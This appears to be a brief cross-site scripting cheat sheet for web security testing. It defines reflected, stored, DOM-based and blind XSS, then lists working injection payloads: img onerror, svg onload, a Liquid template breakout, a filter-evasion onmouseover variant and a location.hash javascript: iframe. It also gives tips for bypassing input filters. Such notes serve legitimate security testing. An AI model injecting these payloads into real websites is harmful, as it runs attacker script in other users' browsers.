# Reflected XSS
Occurs when a single HTTP request that isn't stored anywhere on the site delivers
and executes the XSS playload. This is attempted to be prevented with XSS auditors.

# Stored XSS
Occurs when a site saves a malicious payload and renders it unsanitized.

# DOM based attacks
Modify the DOM to inject.

# Blind XSS
A stored XSS attack in which another user renders the XSS payload from a location
of the website the attacker can't access.

# Liquid Templates
${{amount}}"> <img src=x onerror=alert(document.domain)>

# Miscellaneous
Try replacing spaces with slashes or adding boolean values with equal signs.
<img ismap='xxx' itemtype='yyy style=width:100%;height:100%; onmouseover=alert(/XSS/)//>

Try looking at accepted upload types too. Perhaps JSON is allow which the following
can be passed into. Always test alternative input methods.
#"><img src=/ onerror=alert(3)>
"><svg onload=confirm(1)>
";}document.writeln(decodeURI(location.hash))-"#<iframe src=javascript:alert(document.domain)></iframe>;
